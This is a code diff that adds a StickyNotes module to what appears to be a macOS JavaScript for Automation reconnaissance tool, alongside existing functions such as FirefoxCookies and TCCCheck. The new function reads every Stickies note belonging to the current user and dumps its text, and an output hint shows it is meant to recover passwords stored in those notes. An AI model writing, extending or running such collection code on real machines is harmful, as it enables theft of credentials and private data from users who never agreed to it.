@@ -604,7 +604,58 @@ return results
 
 	///////////////////////
 
+	function StickyNotes(){ //Added by docFord
+		var results = "";
+		var fileMan = $.NSFileManager.defaultManager;
+		var err;
+		var username = $.NSUserName().js
+		var stickiespath = '/Users/' + username + '/Library/Containers/com.apple.Stickies/Data/Library/Stickies/';
+		if (fileMan.fileExistsAtPath(stickiespath)){
+			let sticky_files = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(stickiespath,$()));
+			if (sticky_files.length > 1){ // This accounts for .SavedStickiesState (the sticky plist)
+				results += "\n[+] Sticky Files Found:\n";
+				results += sticky_files + "\n\n";
+				results += "[~] If a password is the last item in a sticky note, it will end with a '}', this is for the content of the sticky note and not a part of the password.\n\n"
+				results += "Sticky File Contents: \n";
+				results += "=============================\n\n";
+				try{
+					for (p=0; p< sticky_files.length; p++){
+						if (sticky_files[p].includes('DS_Store') || sticky_files[p].includes('SavedStickiesState')){
+						continue;
+						}
+						var changeto = stickiespath + sticky_files[p];
+						let rtf_files = ObjC.deepUnwrap(fileMan.contentsOfDirectoryAtPathError(changeto,$()));
+						results += "RTF FILES FOUND: " + rtf_files + "\n";
+						for (q=0; q< rtf_files.length; q++){
+							var rtfFilePath = changeto + "/" + rtf_files[q]
+							if (rtfFilePath.includes('TXT.rtf')){
+								var contents =$.NSString.stringWithContentsOfFileEncodingError(rtfFilePath,$.NSNEXTSTEPStringEncoding, $()).js;
+								results += "Contents of: \n" + rtfFilePath + "\n";
+								results += "---------------------------------------------------------------\n\n"
+								results += contents;
+								results += "\n---------------------------------------------------------------\n"
+							}
+							else {
+							results += "\nNon-RTF file found: \n======================\n" + changeto + "/" + rtf_files[q] + "\n\n";
+							results += "[!] Review this file manually\n\n======================\n\n\n";
+							}
+						}
+					}
+				}
+				catch(err){
+					results += err;
+					results += "\n";
+				}
+			}
+			else {
+				results += "No Sticky Notes found on the system.\n\n"
+			}
+		}
+		results += "#######################################\n";
+		return results;
+	}
 
+	///////////////////////
 
 if (options == "All"){
 	var1 = TCCCheck();
@@ -633,6 +684,9 @@ if (options == "All"){
 
 	var9 = FirefoxCookies();
 	outstring += var9;
+
+	var10 = StickyNotes();
+	outstring += var10;
 
 }
 else {
@@ -687,7 +741,11 @@ else {
 		var9 = FirefoxCookies();
 		outstring += var9;
 	}
-
+	
+	if (options.includes("StickyNotes")){
+		var10 = StickyNotes();
+		outstring += var10;
+	}
 }
 
 
@@ -715,3 +773,4 @@ else {
 //InstalledApps
 //FirefoxCookies
 //LockCheck
+//StickyNotes
